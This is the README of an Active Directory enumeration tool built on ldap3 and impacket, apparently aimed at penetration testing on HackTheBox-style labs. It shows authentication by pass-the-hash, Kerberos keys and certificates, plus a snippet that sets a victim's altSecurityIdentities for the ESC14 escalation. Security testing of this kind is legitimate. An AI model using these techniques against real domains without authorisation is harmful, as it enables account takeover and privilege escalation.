########
ACE Dump
########

| Enumerating AD ACEs using ldap3 and impacket python3 librairies.
| ACE is also meant to be a toolbox for additional features.

|

***************
Getting Started
***************

.. code-block:: bash

    pipx install git+https://github.com/charlesgargasson/acedump.git@main
    # pipx uninstall acedump
    # pipx upgrade acedump

    # sudo apt install -y libkrb5-dev
    # sudo yum install -y krb5-devel

    # DEV install
    # pipx install /opt/git/acedump --editable

|

.. image:: demo/img1.png
  :width: 1200
  :alt: IMG1

|

***********
Credentials
***********

| ACEDump support NTLM, Kerberos, X509 certificates (no pfx support yet), NT hash, AES hash, user/password, TLS (636) and StartTLS (389).
| If you don't provide any hash or password, ACEDump will try a blank password.
|
| Kerberos auth require valid DNS entries.
| If no kerberos ccache set, ACEDump retrieve a new TGT.
| If no kerberos configuration set, ACEDump will use its own.

.. code-block:: bash

    # Kerberos CCACHE
    export KRB5CCNAME='USER.ccache'
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB -k

    # Kerberos NTHash (etype23)
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB -H 31d6cfe0d16ae931b73c59d7e0c089c0 -k

    # Kerberos AES
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB --aes 910e4c922b7516d4a17f05b5ae6a147578564284fff8461a02298ac9263bc913 -k

    # Kerberos user/password
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB -p 'FooBar_123' -k

    # Certificate X509 PEM over TLS (636)
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB --cert user.crt --certkey user.key --tls

    # Certificate X509 PEM with StartTLS (389)
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB --cert user.crt --certkey user.key

    # NTLM (password or hash)
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB -H 31d6cfe0d16ae931b73c59d7e0c089c0
    ace ldap DC01.BOX.HTB -u USER -d BOX.HTB -p 'FooBar_123'

    # Anonymous (untested)
    ace ldap DC01.BOX.HTB

|

***
NTP
***

| ACEDump mock LDAP's clock using currentTime attribute and libfaketime (there is no NTP request).
| Use dontfixtime option if you want to deal with clock skew by yourself.

|

****
Exec
****

| ACEDump can execute python code from stdin after connection.
| The connection object is "conn".

.. code-block:: bash

    ace ldap 10.129.211.247 -u john -p Pototo_1 -e <<< 'print(conn)'
    cat script.py | ace ldap 10.129.211.247 -u john -p Pototo_1 -e

    cat <<'EOF'| ace ldap 10.129.211.247 -u john -p Pototo_1 -e
    conn.search(args.basedn, '(SamAccountName=Administrator)', attributes=['*'])
    print(conn.entries)
    EOF

|

***********
Interactive
***********

| ACEDump start a python console after connection.
| The connection object is "conn"

|

.. code-block::

    $ ace ldap 10.129.211.247 -u john -p Pototo_1 -i -q
    [...]
    >>> print(conn)
    ldap://10.129.211.247:389 - cleartext - user: BOX.HTB\john - not lazy - bound - open - <local: 10.10.14.191:54227 - remote: 10.129.211.247:389> - tls started - listening - SyncStrategy - internal decoder

|

| Example to set VICTIM's altSecurityIdentities attribute for ESC14.

.. code-block:: bash

    target_dn = 'CN=victim,OU=Foobar,DC=box,DC=htb'
    issuer = 'DC=htb, DC=box, CN=box-DC01-CA'
    serial = '61:00:00:00:05:3d:d7:2a:1a:e6:6f:aa:f3:00:00:00:00:00:04'

    serial = ''.join(serial.split(':')[::-1])
    altSecurityIdentities = f"X509:<I>{issuer.replace(', ', ',')}<SR>{serial}"
    
    print(altSecurityIdentities)
    # X509:<I>DC=htb,DC=box,CN=box-DC01-CA<SR>040000000000f3aa6fe61a2ad73d0500000061

    import ldap3
    conn.modify(target_dn,{'altSecurityIdentities':[(ldap3.MODIFY_ADD, altSecurityIdentities)]})
    # Return True if changed

|

| Example to search user using SamAccountName attribute

.. code-block:: bash

    conn.search(args.basedn, '(SamAccountName=administrator)', attributes=['*'])
    conn.entries

|


***************
TroubleShooting
***************

| https://offsec.almond.consulting/ldap-authentication-in-active-directory-environments.html